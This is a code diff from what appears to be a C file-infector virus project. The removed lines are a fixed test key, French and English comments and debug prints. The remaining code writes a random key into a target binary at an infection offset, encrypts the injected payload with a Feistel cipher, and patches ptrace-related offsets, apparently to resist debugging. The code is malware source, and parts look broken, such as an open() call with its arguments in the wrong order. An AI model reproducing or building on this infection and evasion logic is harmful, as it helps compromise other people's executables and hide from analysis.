@@ -26,8 +26,6 @@ void manual_modif(uint8_t *ptrace, uint8_t *ptrace_end, uint8_t *decrypt) {
     }
 }
 
-
-
 uint32_t generate_random_key() {
     int64_t fd;
 	open(fd, "/dev/urandom", O_RDONLY);
@@ -44,7 +42,6 @@ uint32_t generate_random_key() {
     }
 
     close(fd);
-    key = 0xbebecaca; // For testing purposes
     return key;
 }
 
@@ -170,22 +167,11 @@ bool	infect(profiling *this, const str path) {
 	// Write the key
 	ft_memcpy(data.file + data.infection_offset_file + this->size - 139, (byte *)&key, 4);
 
-	/* encrypt le code
-		debut = data.file + data.infection_offset_file
-		fin = data.file + data.infection_offset_file + this.size - _START_SIZE
-	*/
-
 	feistel_encrypt(data.file + data.infection_offset_file, this->size - _START_SIZE - 1, key);
 
 	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 188;
 	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 162;
 	byte *decrypt_start = data.file + data.infection_offset_file + this->size - 155;
-
-	// // write ptrace_start, ptrace_end, decrypt_start, i want the pointer so 0x... not the value
-	// // write(ret, 1, ptrace_start, 8);
-	// // write(ret, 1, ptrace_end, 8);
-	// // write(ret, 1, decrypt_start, 8);
-
 
 	manual_modif(ptrace_start, ptrace_end, decrypt_start);
 
